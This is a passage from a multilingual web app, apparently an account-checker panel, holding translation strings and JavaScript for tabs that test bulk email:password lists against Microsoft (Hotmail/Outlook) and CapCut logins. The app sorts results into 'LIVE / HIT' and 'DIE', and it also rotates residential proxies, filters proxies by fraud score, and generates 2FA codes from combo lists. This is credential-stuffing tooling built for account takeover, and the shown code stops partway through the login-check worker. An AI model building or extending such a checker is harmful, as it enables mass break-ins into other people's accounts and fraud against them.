ПРОКСИ", "prx_btn_sample": "Пример", "prx_btn_clear": "Очистить", "prx_input_ph": "Пример:\\n192.168.1.1:8080\\n192.168.1.1:8080:user:pass", "prx_threads_label": "ПОТОКИ", "prx_timeout_label": "ТАЙМАУТ (сек)", "prx_scamalytics_toggle": "Глубокая проверка фрода Scamalytics", "prx_btn_start": "Начать проверку", "prx_btn_stop": "Стоп", "prx_stat_total": "ВСЕГО", "prx_stat_live": "ЖИВЫЕ (LIVE)", "prx_stat_dead": "МЕРТВЫЕ (DEAD)", "prx_stat_latency": "СР. ПИНГ", "prx_stat_clean": "НИЗКИЙ РИСК (<25)", "prx_filter_all": "Все", "prx_filter_live": "Живые", "prx_filter_dead": "Мертвые", "prx_filter_clean": "Чистые (<25)", "prx_search_ph": "Поиск IP / Страны...", "prx_btn_export": "Экспорт", "prx_exp_live_raw": "Копировать Live (Исходный формат)", "prx_exp_live_ipport": "Копировать Live (HOST:PORT)", "prx_exp_live_txt": "Скачать Live (.TXT)", "prx_exp_report_json": "Скачать полный отчет (.JSON)", "prx_th_proxy": "ПРОКСИ", "prx_th_status": "СТАТУС", "prx_th_ping": "ПИНГ", "prx_th_loc": "ВЫХОДНОЙ IP И ЛОКАЦИЯ", "prx_th_isp": "ПРОВАЙДЕР / ОРГ", "prx_th_fraud": "РИСК ФРОДА", "prx_th_act": "ИНФО", "prx_empty_table": "Прокси еще не проверены. Вставьте список и нажмите <b>Начать проверку</b>.", "prx_no_match": "Нет прокси, соответствующих фильтру.", "prx_modal_title": "Диагностика Прокси", "prx_modal_close": "Закрыть", "prx_alert_empty": "Пожалуйста, введите список прокси!", "prx_no_live_copy": "Нет LIVE прокси для копирования.", "prx_no_live_dl": "Нет LIVE прокси для скачивания.", "nav_menu": "Меню", "tab_hotmail": "MS Mail Checker", "hm_card_title": "MS Mail Checker", "hm_desc": "Check Microsoft account (Hotmail / Outlook / Live) login validity (email:password or email|password) with Country Detection.", "hm_acc_label": "ACCOUNT LIST (email:pass / email|pass)", "hm_acc_ph": "user1@hotmail.com:password123\\nuser2@outlook.com|password456", "hm_use_proxy_label": "Use Proxy (Recommended)", "hm_proxy_label": "PROXY URL (HTTP/SOCKS5)", "hm_threads_label": "THREADS", "hm_timeout_label": "TIMEOUT (s)", "hm_btn_start": "Start Hotmail Check", "hm_btn_stop": "Stop", "hm_results_title": "Hotmail Check Results", "hm_btn_dl_live": "Save LIVE (.txt)", "hm_live_title": "LIVE / HIT", "hm_live_ph": "LIVE accounts (login OK + country) will appear here...", "hm_die_title": "DIE / WRONG PASS", "hm_die_ph": "DIE accounts (wrong pass / not found) will appear here...", "hm_btn_copy": "Copy", "hm_btn_save": "Save", "hm_alert_empty": "Please enter Hotmail/Outlook account list!", "hm_alert_no_valid": "No valid email:pass account format found."}, "es": {"brand_sub": "HERRAMIENTAS MÚLTIPLES • SERVICIOS SOCIALES", "tab_mail": "Verificador de Mail", "tab_capcut": "Verificador CapCut", "tab_2fa": "Generador 2FA", "tab_proxy": "Verificador de Proxy", "tm_accounts_title": "Cuentas", "tm_clear_all_title": "Borrar todas las cuentas", "tm_search_acc_ph": "Buscar correo de cuenta...", "tm_upload_txt": "Subir .TXT", "tm_upload_txt_title": "Subir archivo .TXT (Lectura masiva)", "tm_add_btn": "Añadir", "tm_add_btn_title": "Añadir cuenta manual", "tm_mode_search": "Modo: Buscar Correo", "tm_mode_all": "Modo: Todas las Cuentas", "tm_show_all": "Mostrar Todo", "tm_search_only": "Solo Buscar", "tm_empty_acc_msg": "Aún no hay cuentas.<br>Sube un archivo <b>.TXT</b> o pulsa <b>Añadir</b>.", "tm_inbox_title": "BANDEJA DE ENTRADA", "tm_btn_accounts": "Cuentas", "tm_filter_msg_ph": "Filtrar remitente / asunto...", "tm_empty_inbox_select": "Selecciona una cuenta a la izquierda para ver los mensajes.", "tm_active_email_placeholder": "Seleccionar Cuenta", "tm_badge_standby": "● En espera", "tm_badge_connected": "● Conectado", "tm_badge_disconnected": "● Desconectado", "tm_btn_copy": "Copiar", "tm_no_email_selected": "Ningún correo seleccionado", "tm_click_inbox_hint": "Haz clic en un correo de la lista para leer su contenido.", "tm_otp_detected": "CÓDIGO DE VERIFICACIÓN / OTP DETECTADO", "tm_btn_copy_otp": "Copiar OTP", "tm_copied": "¡Copiado!", "tm_search_another_title": "Buscar Otra Cuenta", "tm_search_another_desc": "Escribe el correo en el cuadro de búsqueda para elegir una cuenta.", "tm_accounts_avail": "Cuentas Disponibles", "tm_inbox_empty": "Bandeja vacía.", "tm_no_msg_filter": "No hay mensajes que coincidan con el filtro.", "tm_no_acc_match": "No se encontraron cuentas", "tm_delete_acc_confirm": "¿Eliminar {email} de la lista?", "tm_clear_all_confirm": "¿Borrar todas las cuentas del verificador?", "tm_extracting": "Extrayendo y verificando cuentas...", "tm_modal_add_title": "Añadir Cuentas Outlook / Hotmail", "tm_modal_upload_label": "SUBIR ARCHIVO .TXT (Importación Masiva)", "tm_modal_paste_label": "O PEGAR TOKENS (email|pass|refresh_token|client_id)", "tm_modal_proxy_label": "PROXY (Opcional: http://user:pass@host:port)", "tm_modal_proxy_ph": "Dejar en blanco si es directo", "tm_modal_btn_cancel": "Cancelar", "tm_modal_btn_import": "Importar y Verificar", "cc_card_title": "Entrada de Cuentas CapCut", "cc_acc_label": "LISTA DE CUENTAS (email:pass, email|pass, etc)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "URL PROXY RESIDENCIAL (Obligatorio)", "cc_proxy_help": "Usa <code>{sess}</code> para rotación automática de IP.", "cc_threads_label": "HILOS", "cc_retries_label": "REINTENTOS IP", "cc_btn_start": "Iniciar Verificación CapCut", "cc_btn_stop": "Detener", "cc_results_title": "Resultados de Verificación CapCut", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "Las cuentas PRO aparecerán aquí...", "cc_free_title": "FREE / REGULAR", "cc_free_ph": "Las cuentas FREE aparecerán aquí...", "cc_dead_title": "DEAD / ERROR", "cc_dead_ph": "Las cuentas fallidas aparecerán aquí...", "cc_btn_copy": "Copiar", "cc_btn_save": "Guardar", "cc_alert_empty": "¡Por favor ingresa la lista de cuentas CapCut!", "cc_alert_no_valid": "¡No se encontraron cuentas válidas!", "tfa_single_title": "Código 2FA Rápido (Individual)", "tfa_single_desc": "Ingresa la clave secreta 2FA (Base32) para obtener códigos instantáneos de 6 dígitos.", "tfa_single_label": "CLAVE SECRETA 2FA", "tfa_single_ph": "Ejemplo: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Obtener Código", "tfa_auth_code_label": "CÓDIGO DE AUTENTICACIÓN", "tfa_btn_copy_code": "Copiar Código", "tfa_bulk_title": "Generador 2FA Masivo", "tfa_bulk_desc": "Soporta pegar múltiples claves o líneas combo (formato <code>email|pass|secret</code>).", "tfa_bulk_label": "LISTA DE CLAVES / COMBOS", "tfa_bulk_ph": "Ejemplo:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...", "tfa_btn_gen_all": "Generar Todos los Códigos", "tfa_bulk_res_label": "RESULTADOS (FORMATO COMBO + CÓDIGO 2FA)", "tfa_bulk_res_ph": "Los códigos 2FA aparecerán aquí...", "tfa_alert_empty_single": "¡Por favor ingresa la clave secreta 2FA!", "tfa_alert_empty_bulk": "¡Por favor ingresa la lista de claves o combos!", "tfa_processing": "Procesando...", "prx_title": "Verificador de Proxy", "prx_desc": "Formatos: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, o <code>scheme://...</code>", "prx_input_label": "LISTA DE PROXIES", "prx_btn_sample": "Ejemplo", "prx_btn_clear": "Limpiar", "prx_input_ph": "Ejemplo:\\n192.168.1.1:8080\\n192.168.1.1:8080:user:pass", "prx_threads_label": "HILOS", "prx_timeout_label": "TIEMPO DE ESPERA (s)", "prx_scamalytics_toggle": "Verificación de Riesgo de Fraude Scamalytics", "prx_btn_start": "Iniciar Verificación", "prx_btn_stop": "Detener", "prx_stat_total": "TOTAL", "prx_stat_live": "VIVOS (LIVE)", "prx_stat_dead": "MUERTOS (DEAD)", "prx_stat_latency": "PING PROMEDIO", "prx_stat_clean": "BAJO FRAUDE (<25)", "prx_filter_all": "Todos", "prx_filter_live": "Vivos", "prx_filter_dead": "Muertos", "prx_filter_clean": "Bajo Fraude", "prx_search_ph": "Buscar IP / País...", "prx_btn_export": "Exportar", "prx_exp_live_raw": "Copiar Live (Formato Original)", "prx_exp_live_ipport": "Copiar Live (HOST:PORT)", "prx_exp_live_txt": "Descargar Live (.TXT)", "prx_exp_report_json": "Descargar Reporte Completo (.JSON)", "prx_th_proxy": "PROXY", "prx_th_status": "ESTADO", "prx_th_ping": "PING", "prx_th_loc": "IP SALIDA Y UBICACIÓN", "prx_th_isp": "PROVEEDOR / ORG", "prx_th_fraud": "RIESGO FRAUDE", "prx_th_act": "DETALLES", "prx_empty_table": "No se han verificado proxies aún. Ingresa la lista y pulsa <b>Iniciar Verificación</b>.", "prx_no_match": "No hay proxies que coincidan con el filtro.", "prx_modal_title": "Detalles de Diagnóstico de Proxy", "prx_modal_close": "Cerrar", "prx_alert_empty": "¡Por favor ingresa la lista de proxies!", "prx_no_live_copy": "No hay proxies LIVE para copiar.", "prx_no_live_dl": "No hay proxies LIVE para descargar.", "nav_menu": "Menú", "tab_hotmail": "MS Mail Checker", "hm_card_title": "MS Mail Checker", "hm_desc": "Check Microsoft account (Hotmail / Outlook / Live) login validity (email:password or email|password) with Country Detection.", "hm_acc_label": "ACCOUNT LIST (email:pass / email|pass)", "hm_acc_ph": "user1@hotmail.com:password123\\nuser2@outlook.com|password456", "hm_use_proxy_label": "Use Proxy (Recommended)", "hm_proxy_label": "PROXY URL (HTTP/SOCKS5)", "hm_threads_label": "THREADS", "hm_timeout_label": "TIMEOUT (s)", "hm_btn_start": "Start Hotmail Check", "hm_btn_stop": "Stop", "hm_results_title": "Hotmail Check Results", "hm_btn_dl_live": "Save LIVE (.txt)", "hm_live_title": "LIVE / HIT", "hm_live_ph": "LIVE accounts (login OK + country) will appear here...", "hm_die_title": "DIE / WRONG PASS", "hm_die_ph": "DIE accounts (wrong pass / not found) will appear here...", "hm_btn_copy": "Copy", "hm_btn_save": "Save", "hm_alert_empty": "Please enter Hotmail/Outlook account list!", "hm_alert_no_valid": "No valid email:pass account format found."}, "pt": {"brand_sub": "MULTI FERRAMENTAS • PAINEL SOCIAL", "tab_mail": "Verificador de E-mail", "tab_capcut": "Verificador CapCut", "tab_2fa": "Gerador 2FA", "tab_proxy": "Verificador de Proxy", "tm_accounts_title": "Contas", "tm_clear_all_title": "Limpar Todas as Contas", "tm_search_acc_ph": "Buscar e-mail da conta...", "tm_upload_txt": "Upload .TXT", "tm_upload_txt_title": "Enviar Arquivo .TXT (Importação em Massa)", "tm_add_btn": "Adicionar", "tm_add_btn_title": "Adicionar Conta Manualmente", "tm_mode_search": "Modo: Buscar E-mail", "tm_mode_all": "Modo: Todas as Contas", "tm_show_all": "Mostrar Todas", "tm_search_only": "Apenas Busca", "tm_empty_acc_msg": "Nenhuma conta ainda.<br>Envie um arquivo <b>.TXT</b> ou clique em <b>Adicionar</b>.", "tm_inbox_title": "CAIXA DE ENTRADA", "tm_btn_accounts": "Contas", "tm_filter_msg_ph": "Filtrar remetente / assunto...", "tm_empty_inbox_select": "Selecione uma conta à esquerda para ver os e-mails.", "tm_active_email_placeholder": "Selecionar Conta", "tm_badge_standby": "● Em espera", "tm_badge_connected": "● Conectado", "tm_badge_disconnected": "● Desconectado", "tm_btn_copy": "Copiar", "tm_no_email_selected": "Nenhum e-mail selecionado", "tm_click_inbox_hint": "Clique em um e-mail na lista para ler seu conteúdo.", "tm_otp_detected": "CÓDIGO DE VERIFICAÇÃO / OTP DETECTADO", "tm_btn_copy_otp": "Copiar OTP", "tm_copied": "Copiado!", "tm_search_another_title": "Buscar Outra Conta", "tm_search_another_desc": "Digite o e-mail na busca acima para selecionar uma conta.", "tm_accounts_avail": "Contas Disponíveis", "tm_inbox_empty": "Caixa de entrada vazia.", "tm_no_msg_filter": "Nenhuma mensagem corresponde ao filtro.", "tm_no_acc_match": "Nenhuma conta encontrada", "tm_delete_acc_confirm": "Remover {email} da lista?", "tm_clear_all_confirm": "Limpar todas as contas do verificador?", "tm_extracting": "Extraindo e verificando contas...", "tm_modal_add_title": "Adicionar Contas Outlook / Hotmail", "tm_modal_upload_label": "ENVIAR ARQUIVO .TXT (Importação em Massa)", "tm_modal_paste_label": "OU COLAR TOKENS (email|pass|refresh_token|client_id)", "tm_modal_proxy_label": "PROXY (Opcional: http://user:pass@host:port)", "tm_modal_proxy_ph": "Deixe em branco se for conexão direta", "tm_modal_btn_cancel": "Cancelar", "tm_modal_btn_import": "Importar e Verificar", "cc_card_title": "Entrada de Contas CapCut", "cc_acc_label": "LISTA DE CONTAS (email:pass, email|pass, etc)", "cc_acc_ph": "user1@example.com:password123\\nuser2@example.com|password456", "cc_proxy_label": "URL PROXY RESIDENCIAL (Obrigatório)", "cc_proxy_help": "Use <code>{sess}</code> para rotação automática de IP.", "cc_threads_label": "THREADS", "cc_retries_label": "TENTATIVAS IP", "cc_btn_start": "Iniciar Checagem CapCut", "cc_btn_stop": "Parar", "cc_results_title": "Resultados de Checagem CapCut", "cc_pro_title": "PRO / VIP", "cc_pro_ph": "Contas PRO aparecerão aqui...", "cc_free_title": "FREE / REGULAR", "cc_free_ph": "Contas FREE aparecerão aqui...", "cc_dead_title": "DEAD / ERRO", "cc_dead_ph": "Contas com erro aparecerão aqui...", "cc_btn_copy": "Copiar", "cc_btn_save": "Salvar", "cc_alert_empty": "Por favor, insira a lista de contas CapCut!", "cc_alert_no_valid": "Nenhuma conta válida encontrada!", "tfa_single_title": "Código 2FA Rápido (Individual)", "tfa_single_desc": "Insira a chave secreta 2FA (Base32) para gerar códigos de verificação de 6 dígitos instantaneamente.", "tfa_single_label": "CHAVE SECRETA 2FA", "tfa_single_ph": "Exemplo: JBSWY3DPEHPK3PXP", "tfa_btn_get": "Obter Código", "tfa_auth_code_label": "CÓDIGO DE AUTENTICAÇÃO", "tfa_btn_copy_code": "Copiar Código", "tfa_bulk_title": "Gerador 2FA em Massa", "tfa_bulk_desc": "Suporta colar várias chaves ou linhas combo (formato <code>email|pass|secret</code>).", "tfa_bulk_label": "LISTA DE CHAVES / COMBOS", "tfa_bulk_ph": "Exemplo:\\nuser1@email.com|pass1|JBSWY3DPEHPK3PXP\\nuser2@email.com:pass2:4X72J6...", "tfa_btn_gen_all": "Gerar Todos os Códigos", "tfa_bulk_res_label": "RESULTADOS (FORMATO COMBO + CÓDIGO 2FA)", "tfa_bulk_res_ph": "Os códigos 2FA gerados aparecerão aqui...", "tfa_alert_empty_single": "Por favor, insira a chave secreta 2FA!", "tfa_alert_empty_bulk": "Por favor, insira a lista de chaves ou combos!", "tfa_processing": "Processando...", "prx_title": "Verificador de Proxy", "prx_desc": "Formatos: <code>HOST:PORT</code>, <code>HOST:PORT:USER:PASS</code>, <code>USER:PASS:HOST:PORT</code>, ou <code>scheme://...</code>", "prx_input_label": "LISTA DE PROXIES", "prx_btn_sample": "Exemplo", "prx_btn_clear": "Limpar", "prx_input_ph": "Exemplo:\\n192.168.1.1:8080\\n192.168.1.1:8080:user:pass", "prx_threads_label": "THREADS", "prx_timeout_label": "TIMEOUT (s)", "prx_scamalytics_toggle": "Verificação de Score de Fraude Scamalytics", "prx_btn_start": "Iniciar Checagem", "prx_btn_stop": "Parar", "prx_stat_total": "TOTAL", "prx_stat_live": "VIVOS (LIVE)", "prx_stat_dead": "MORTOS (DEAD)", "prx_stat_latency": "PING MÉDIO", "prx_stat_clean": "BAIXO RISCO (<25)", "prx_filter_all": "Todos", "prx_filter_live": "Vivos", "prx_filter_dead": "Mortos", "prx_filter_clean": "Baixo Risco", "prx_search_ph": "Buscar IP / País...", "prx_btn_export": "Exportar", "prx_exp_live_raw": "Copiar Live (Formato Original)", "prx_exp_live_ipport": "Copiar Live (HOST:PORT)", "prx_exp_live_txt": "Baixar Live (.TXT)", "prx_exp_report_json": "Baixar Relatório Completo (.JSON)", "prx_th_proxy": "PROXY", "prx_th_status": "STATUS", "prx_th_ping": "PING", "prx_th_loc": "IP DE SAÍDA E LOCALIZAÇÃO", "prx_th_isp": "PROVEDOR / ORG", "prx_th_fraud": "RISCO DE FRAUDE", "prx_th_act": "DETALHES", "prx_empty_table": "Nenhum proxy verificado ainda. Insira a lista e clique em <b>Iniciar Checagem</b>.", "prx_no_match": "Nenhum proxy corresponde ao filtro.", "prx_modal_title": "Detalhes de Diagnóstico do Proxy", "prx_modal_close": "Fechar", "prx_alert_empty": "Por favor, insira a lista de proxies!", "prx_no_live_copy": "Nenhum proxy LIVE para copiar.", "prx_no_live_dl": "Nenhum proxy LIVE para baixar.", "nav_menu": "Menu", "tab_hotmail": "MS Mail Checker", "hm_card_title": "MS Mail Checker", "hm_desc": "Check Microsoft account (Hotmail / Outlook / Live) login validity (email:password or email|password) with Country Detection.", "hm_acc_label": "ACCOUNT LIST (email:pass / email|pass)", "hm_acc_ph": "user1@hotmail.com:password123\\nuser2@outlook.com|password456", "hm_use_proxy_label": "Use Proxy (Recommended)", "hm_proxy_label": "PROXY URL (HTTP/SOCKS5)", "hm_threads_label": "THREADS", "hm_timeout_label": "TIMEOUT (s)", "hm_btn_start": "Start Hotmail Check", "hm_btn_stop": "Stop", "hm_results_title": "Hotmail Check Results", "hm_btn_dl_live": "Save LIVE (.txt)", "hm_live_title": "LIVE / HIT", "hm_live_ph": "LIVE accounts (login OK + country) will appear here...", "hm_die_title": "DIE / WRONG PASS", "hm_die_ph": "DIE accounts (wrong pass / not found) will appear here...", "hm_btn_copy": "Copy", "hm_btn_save": "Save", "hm_alert_empty": "Please enter Hotmail/Outlook account list!", "hm_alert_no_valid": "No valid email:pass account format found."}};
    const LANG_META = {
  "id": { "flag": "🇮🇩", "code": "ID", "name": "Bahasa Indonesia" },
  "en": { "flag": "🇬🇧", "code": "EN", "name": "English" },
  "vi": { "flag": "🇻🇳", "code": "VI", "name": "Tiếng Việt" },
  "zh": { "flag": "🇨🇳", "code": "ZH", "name": "简体中文" },
  "ru": { "flag": "🇷🇺", "code": "RU", "name": "Русский" },
  "es": { "flag": "🇪🇸", "code": "ES", "name": "Español" },
  "pt": { "flag": "🇧🇷", "code": "PT", "name": "Português" }
};
    let currentAppLang = 'id';

    function getI18nText(key, fallback = '') {
      if (I18N_DICTS[currentAppLang] && I18N_DICTS[currentAppLang][key] !== undefined) {
        return I18N_DICTS[currentAppLang][key];
      }
      if (I18N_DICTS['id'] && I18N_DICTS['id'][key] !== undefined) {
        return I18N_DICTS['id'][key];
      }
      return fallback;
    }

    function toggleLangMenu(e) {
      if (e) {
        if (e.stopPropagation) e.stopPropagation();
        if (e.preventDefault) e.preventDefault();
      }
      const menu = document.getElementById('langDropdownList');
      if (menu) {
        menu.classList.toggle('show');
      }
    }

    function selectAppLanguage(lang, e) {
      if (e) {
        if (e.stopPropagation) e.stopPropagation();
        if (e.preventDefault) e.preventDefault();
      }
      setAppLanguage(lang);
      const menu = document.getElementById('langDropdownList');
      if (menu) {
        menu.classList.remove('show');
      }
    }

    function setAppLanguage(lang) {
      if (!I18N_DICTS[lang]) lang = 'id';
      currentAppLang = lang;
      try {
        localStorage.setItem('chenstore_app_lang', lang);
      } catch(e) {}

      // Update flag & code in top navbar
      const meta = LANG_META[lang] || LANG_META['id'];
      document.querySelectorAll('.currentLangFlag').forEach(el => el.textContent = meta.flag);
      document.querySelectorAll('.currentLangCode').forEach(el => el.textContent = meta.code);

      // Update active state in dropdown
      document.querySelectorAll('.lang-dropdown-item').forEach(item => {
        const onClickAttr = item.getAttribute('onclick') || '';
        if (onClickAttr.includes("'" + lang + "'")) {
          item.classList.add('active');
        } else {
          item.classList.remove('active');
        }
      });

      // Update text in elements with data-i18n
      document.querySelectorAll('[data-i18n]').forEach(el => {
        const k = el.getAttribute('data-i18n');
        const val = getI18nText(k);
        if (val) {
          if (val.includes('<')) el.innerHTML = val;
          else el.textContent = val;
        }
      });

      // Update placeholders
      document.querySelectorAll('[data-i18n-ph]').forEach(el => {
        const k = el.getAttribute('data-i18n-ph');
        const val = getI18nText(k);
        if (val) el.placeholder = val;
      });

      // Update titles
      document.querySelectorAll('[data-i18n-title]').forEach(el => {
        const k = el.getAttribute('data-i18n-title');
        const val = getI18nText(k);
        if (val) el.title = val;
      });

      // Safely re-render components if available
      try { if (typeof renderAccountsList === 'function') renderAccountsList(); } catch(e) {}
      try { if (typeof renderCurrentMessages === 'function') renderCurrentMessages(); } catch(e) {}
      try { if (typeof updateProxyStats === 'function') updateProxyStats(); } catch(e) {}
      try { if (typeof renderProxyTable === 'function') renderProxyTable(); } catch(e) {}
      try { if (typeof updateCapcutCount === 'function') updateCapcutCount(); } catch(e) {}
    }

    // Close language dropdown when clicking outside
    document.addEventListener('click', function(e) {
      const langWrapper = document.getElementById('langSelectorWrapper');
      if (langWrapper && !langWrapper.contains(e.target)) {
        const menu = document.getElementById('langDropdownList');
        if (menu) menu.classList.remove('show');
      }
      const tabWrapper = document.getElementById('mobileTabDropdownWrapper');
      if (tabWrapper && !tabWrapper.contains(e.target)) {
        const menu = document.getElementById('mobileTabMenuList');
        if (menu) menu.classList.remove('show');
      }
    });

    const TAB_META = {
      mail: { icon: '<i class="fa-solid fa-inbox"></i>', i18n: 'tab_mail' },
      hotmail: { icon: '<i class="fa-brands fa-microsoft"></i>', i18n: 'tab_hotmail' },
      capcut: { icon: '<i class="fa-solid fa-film"></i>', i18n: 'tab_capcut' },
      '2fa': { icon: '<i class="fa-solid fa-key"></i>', i18n: 'tab_2fa' },
      proxy: { icon: '<i class="fa-solid fa-server"></i>', i18n: 'tab_proxy' }
    };

    function toggleMobileTabMenu(e) {
      if (e) {
        if (e.stopPropagation) e.stopPropagation();
        if (e.preventDefault) e.preventDefault();
      }
      const menu = document.getElementById('mobileTabMenuList');
      if (menu) menu.classList.toggle('show');
      const langMenu = document.getElementById('langDropdownList');
      if (langMenu) langMenu.classList.remove('show');
    }

    function selectMobileTab(tabName, e) {
      if (e) {
        if (e.stopPropagation) e.stopPropagation();
        if (e.preventDefault) e.preventDefault();
      }
      switchTab(tabName);
      const menu = document.getElementById('mobileTabMenuList');
      if (menu) menu.classList.remove('show');
    }

    
    
    /* Universal Clipboard Copy (Supports HTTPS, localhost, & Mobile LAN HTTP) */
    function fallbackCopyText(text, callback) {
      try {
        const textArea = document.createElement('textarea');
        textArea.value = text;
        textArea.style.position = 'fixed';
        textArea.style.top = '-9999px';
        textArea.style.left = '-9999px';
        textArea.style.opacity = '0';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        if (callback) callback();
      } catch (err) {
        if (callback) callback();
      }
    }

    function copyToClipboard(text, successMsg = 'Disalin!', icon = 'fa-solid fa-circle-check text-success') {
      if (!text) return;
      const triggerSuccess = () => {
        if (typeof showToast === 'function') {
          showToast(successMsg, icon);
        }
      };

      if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(text)
          .then(triggerSuccess)
          .catch(() => fallbackCopyText(text, triggerSuccess));
      } else {
        fallbackCopyText(text, triggerSuccess);
      }
    }
    
    /* Toast Notification System */
    function showToast(msg, icon = 'fa-solid fa-circle-check text-success') {
      const container = document.getElementById('chenToastContainer');
      if (!container) return;
      container.innerHTML = '';
      const toast = document.createElement('div');
      toast.className = 'chen-toast';
      toast.innerHTML = `<i class="${icon} fs-6"></i> <span>${msg}</span>`;
      container.appendChild(toast);
      setTimeout(() => {
        toast.classList.add('hide');
        setTimeout(() => toast.remove(), 260);
      }, 2000);
    }
    
    window.switchTab = function(tabName) {
      const allTabs = ['mail', 'hotmail', 'capcut', '2fa', 'proxy'];
      allTabs.forEach(name => {
        const btn = document.getElementById('btn-tab-' + name);
        const pane = document.getElementById('tab-' + name);
        if (btn) {
          if (name === tabName) btn.classList.add('active');
          else btn.classList.remove('active');
        }
        if (pane) {
          if (name === tabName) {
            pane.classList.add('active');
            pane.style.display = 'flex';
          } else {
            pane.classList.remove('active');
            pane.style.display = 'none';
          }
        }
      });

      // Update mobile tab dropdown button label & icon
      const iconEl = document.getElementById('activeTabIcon');
      

      // Update active state in mobile dropdown items
      document.querySelectorAll('.mobile-tab-item').forEach(item => {
        const onClickAttr = item.getAttribute('onclick') || '';
        if (onClickAttr.includes("'" + tabName + "'")) {
          item.classList.add('active');
        } else {
          item.classList.remove('active');
        }
      });
    };
    function switchTab(tabName) {
      window.switchTab(tabName);
    }

    /* ================= HOTMAIL / OUTLOOK CHECKER LOGIC ================= */
    let hotmailList = [];
    let hotmailLiveResults = [];
    let hotmailDieResults = [];
    let hotmailAbortController = null;
    let hotmailTotalBytesUsed = 0;

    function formatBytes(bytes) {
      if (!bytes || bytes === 0) return '0 B';
      const k = 1024;
      const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
      const i = Math.floor(Math.log(bytes) / Math.log(k));
      return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    function resetHotmailProxyUsage() {
      hotmailTotalBytesUsed = 0;
      const badge = document.getElementById('hotmailProxyUsageBadge');
      if (badge) badge.textContent = '0 B';
      showToast('Counter kuota proxy direset.', 'fa-solid fa-rotate-left text-info');
    }

    function updateHotmailCount() {
      const input = document.getElementById('hotmailAccountsInput');
      const lines = (input ? input.value : '').split(String.fromCharCode(10)).map(l => l.trim()).filter(l => l && (l.includes(':') || l.includes('|')));
      const countEl = document.getElementById('hotmailAccountCount');
      if (countEl) countEl.textContent = `Total: ${lines.length} akun`;
    }

    function toggleHotmailProxyField() {
      const toggle = document.getElementById('useHotmailProxyToggle');
      const container = document.getElementById('hotmailProxyFieldContainer');
      if (toggle && container) {
        container.style.display = toggle.checked ? 'block' : 'none';
      }
    }

    function loadSampleHotmail() {
      const sample = [
        'sample_user1@hotmail.com:Password123!',
        'sample_user2@outlook.com|SecretPass456',
        'sample_user3@live.com:TestPassword789'
      ].join(String.fromCharCode(10));
      const input = document.getElementById('hotmailAccountsInput');
      if (input) {
        input.value = sample;
        updateHotmailCount();
      }
    }

    function clearHotmailInput() {
      const input = document.getElementById('hotmailAccountsInput');
      if (input) {
        input.value = '';
        updateHotmailCount();
      }
    }

    function updateHotmailProxyCount() {
      const input = document.getElementById('hotmailProxyInput');
      const lines = (input ? input.value : '').split(String.fromCharCode(10)).map(l => l.trim()).filter(l => l && !l.startsWith('#'));
      const lbl = document.getElementById('hotmailProxyCountLabel');
      if (lbl) lbl.textContent = `Total: ${lines.length} proxy (Rotasi per akun)`;
    }

    function handleHotmailProxyFileUpload(e) {
      const file = e.target.files && e.target.files[0];
      if (!file) return;
      const reader = new FileReader();
      reader.onload = function(evt) {
        const content = evt.target.result || '';
        const input = document.getElementById('hotmailProxyInput');
        if (input) {
          input.value = content.trim();
          updateHotmailProxyCount();
          showToast(`Berhasil memuat proxy dari file ${file.name}`, 'fa-solid fa-file-check text-success');
        }
      };
      reader.readAsText(file);
      e.target.value = '';
    }

    async function startHotmailChecking() {
      const rawText = (document.getElementById('hotmailAccountsInput') ? document.getElementById('hotmailAccountsInput').value : '').trim();
      if (!rawText) return showToast(getI18nText('hm_alert_empty', 'Silakan masukkan list akun Hotmail/Outlook!'), 'fa-solid fa-triangle-exclamation text-warning');

      const lines = rawText.split(String.fromCharCode(10)).map(l => l.trim()).filter(l => l && !l.startsWith('#') && (l.includes(':') || l.includes('|') || l.includes(';')));
      if (lines.length === 0) return showToast(getI18nText('hm_alert_no_valid', 'Tidak ada baris akun format email:pass yang valid.'), 'fa-solid fa-triangle-exclamation text-warning');

      const concurrency = Math.min(20, Math.max(1, parseInt(document.getElementById('hotmailWorkersInput').value) || 4));
      const timeout = Math.min(45, Math.max(5, parseInt(document.getElementById('hotmailTimeoutInput').value) || 15));
      const useProxy = Boolean(document.getElementById('useHotmailProxyToggle') && document.getElementById('useHotmailProxyToggle').checked);
      
      let proxyList = [];
      if (useProxy && document.getElementById('hotmailProxyInput')) {
        proxyList = document.getElementById('hotmailProxyInput').value
          .split(String.fromCharCode(10))
          .map(p => p.trim())
          .filter(p => p && !p.startsWith('#'));
      }

      hotmailList = lines;
      hotmailLiveResults = [];
      hotmailLiveItems = [];
      hotmailDieResults = [];
      hotmailAbortController = new AbortController();

      const liveArea = document.getElementById('hotmailLiveResult');
      const dieArea = document.getElementById('hotmailDieResult');
      const liveCnt = document.getElementById('hotmailLiveCount');
      const dieCnt = document.getElementById('hotmailDieCount');
      const progBox = document.getElementById('hotmailProgressBox');
      const progBar = document.getElementById('hotmailProgressBar');
      const progTxt = document.getElementById('hotmailProgressText');
      const proxyBadge = document.getElementById('hotmailProxyUsageBadge');

      if (liveArea) liveArea.value = '';
      if (dieArea) dieArea.value = '';
      if (liveCnt) liveCnt.textContent = '0';
      if (dieCnt) dieCnt.textContent = '0';
      if (progBox) progBox.style.display = 'block';
      if (progBar) progBar.style.width = '0%';
      if (progTxt) progTxt.textContent = `0/${lines.length} (0%)`;

      if (document.getElementById('btnStartHotmail')) document.getElementById('btnStartHotmail').disabled = true;
      if (document.getElementById('btnStopHotmail')) document.getElementById('btnStopHotmail').disabled = false;

      let currentIndex = 0;
      let completedCount = 0;
      const total = lines.length;

      async function worker() {
        while (currentIndex < total) {
          if (hotmailAbortController && hotmailAbortController.signal.aborted) break;
          const idx = currentIndex++;
          const line = lines[idx];

          let email = '';
          let password = '';
          const parts = line.split(/[:|;]+/);
          if (parts.length >= 2) {
            email = parts[0].trim();
            password = parts[1].trim();
          }

